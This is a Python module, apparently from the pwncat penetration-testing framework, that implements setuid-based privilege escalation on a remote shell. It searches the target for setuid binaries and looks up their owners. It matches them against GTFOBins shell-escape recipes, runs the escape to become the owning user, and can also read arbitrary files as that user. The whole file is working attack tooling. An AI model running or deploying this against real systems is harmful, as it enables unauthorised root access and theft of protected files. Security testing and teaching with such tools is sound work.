#!/usr/bin/env python3
from typing import Generator, List
import shlex
import sys
from time import sleep
import os
from colorama import Fore, Style

import io

from pwncat.util import info, success, error, progress, warn
from pwncat.privesc.base import Method, PrivescError, Technique, Capability
from pwncat import gtfobins
from pwncat.file import RemoteBinaryPipe


class SetuidMethod(Method):

    name = "setuid"
    BINARIES = ["find", "stat"]

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        super(SetuidMethod, self).__init__(pty)

        self.suid_paths = None

    def find_suid(self):

        # Spawn a find command to locate the setuid binaries
        delim = self.pty.process("find / -perm -4000 -print 2>/dev/null")
        files = []
        self.suid_paths = {}

        while True:
            path = self.pty.recvuntil(b"\n").strip()
            progress("searching for setuid binaries")

            if delim in path:
                break

            files.append(path.decode("utf-8"))

        for path in files:
            user = (
                self.pty.run(f"stat -c '%U' {shlex.quote(path)}")
                .strip()
                .decode("utf-8")
            )
            if user not in self.suid_paths:
                self.suid_paths[user] = []
            self.suid_paths[user].append(path)

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        if self.suid_paths is None:
            self.find_suid()
        known_techniques = []
        for user, paths in self.suid_paths.items():
            for path in paths:
                binary = gtfobins.Binary.find(path)
                if binary is not None:
                    if (capability & binary.capabilities) == 0:
                        continue

                    known_techniques.append(
                        Technique(user, self, binary, binary.capabilities)
                    )

        return known_techniques

    def execute(self, technique: Technique):
        """ Run the specified technique """

        binary = technique.ident
        enter, input, exit = binary.shell(self.pty.shell, suid=True)

        info(
            f"attempting potential privesc with {Fore.GREEN}{Style.BRIGHT}{binary.path}{Style.RESET_ALL}",
        )

        before_shell_level = self.pty.run("echo $SHLVL").strip()
        before_shell_level = int(before_shell_level) if before_shell_level != b"" else 0

        # Run the start commands
        self.pty.run(enter + "\n", wait=False)

        # Send required input
        self.pty.client.send(input.encode("utf-8"))

        # Wait for result
        self.pty.run("echo")

        # sleep(0.1)
        user = self.pty.run("whoami").strip().decode("utf-8")
        if user == technique.user:
            success("privesc succeeded")
            return exit
        else:
            error(f"privesc failed (still {user} looking for {technique.user})")
            after_shell_level = self.pty.run("echo $SHLVL").strip()
            after_shell_level = (
                int(after_shell_level) if after_shell_level != b"" else 0
            )
            if after_shell_level > before_shell_level:
                info("exiting spawned inner shell")
                self.pty.run(exit, wait=False)  # here be dragons

        raise PrivescError(f"escalation failed for {technique}")

    def read_file(self, filepath: str, technique: Technique) -> RemoteBinaryPipe:
        binary = technique.ident
        read_payload = binary.read_file(filepath)

        # read_pipe = self.pty.subprocess(read_payload)
        read_pipe = io.BytesIO(self.pty.run(read_payload))

        return read_pipe

    def get_name(self, tech: Technique):
        return f"{Fore.GREEN}{tech.user}{Fore.RESET} via {Fore.CYAN}{tech.ident.path}{Fore.RESET} ({Fore.RED}setuid{Fore.RESET})"
